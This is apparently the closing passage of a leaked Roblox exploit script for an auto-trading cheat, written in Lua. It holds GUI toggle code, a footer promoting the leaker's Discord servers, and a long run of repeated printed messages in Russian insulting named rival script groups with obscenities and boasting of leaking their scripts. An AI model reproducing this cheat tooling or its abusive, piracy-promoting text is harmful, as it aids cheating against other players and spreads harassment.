    AddLog("ТУН ТУН ТУН ТУМАЕВ ПЕРДУН", Colors.Error)

    CreateTween(StartBtn, {BackgroundColor3 = Colors.Accent}, 0.3):Play()
    StartLabel.Text = "▶  START TRADING КРИПТОТРЕЙД В БИО"

    getgenv().STOP_TRADING = true
end)

--// ═══════════════════════════════════════════════════════════════
--//  TOGGLE KEYBIND (Right Ctrl)
--// ═══════════════════════════════════════════════════════════════

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.RightControl then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

AddLog("Press Right Ctrl to toggle GUI НАЖМИ ПРАВЫЙ КНТРЛ СУКА", Colors.Pink)

--// ═══════════════════════════════════════════════════════════════
--//  FOOTER
--// ═══════════════════════════════════════════════════════════════

local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, 0, 0, 20)
Footer.BackgroundTransparency = 1
Footer.Text = "LEAKED BY SUNZER | FAKECRIME.BIO/SUNZER https://discord.gg/pXMnnt3bP3"
Footer.TextSize = 9
Footer.Font = Enum.Font.Gotham
Footer.TextColor3 = Colors.TextMuted
Footer.LayoutOrder = 6
Footer.Parent = ContentFrame

print("$$$ LEAK BY SUNZER DMYTRIEVSKIY")
print("SUNZWAVE DISCORD SERVER - https://discord.gg/pXMnnt3bP3")
print("BIGHVH DISCORD SERVER - https://dsc.gg/bighvh")
print("ALSO VISIT https://fakecrime.bio/sunzer")
print("")
print("")
print("")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
print("FETCHED AND LEAKED BY SUNZER DMYTRIEVSKIY SUNZWAVE СИЛА SHADOWHUB МОГИЛА ANOBIZ И BRINDSIGHT СЫНЫ ШЛЮХ ДОРАТИЛИСЬ БЛЯДИ ЕБАННЫЕ ВАШИ СКРИПТЫ БУДУТ СЛИТЫ НА ЮГЕЙМЕ ЛОЛЗТИМЕ БЛАСТХАКЕ RSCRIPTS SCRIPTBLOX И НА МОЕМ ДС СЕРВЕРЕ https://discord.gg/pXMnnt3bP3 ДАЖЕ ЕСЛИ НА ОДНОМ ИЗ ЭТИХ САЙТОВ НЕ БУДЕТ ТЕМЫ ВСЁ РАВНО ЛИК МОЖНО БУДЕТ НАЙТИ")
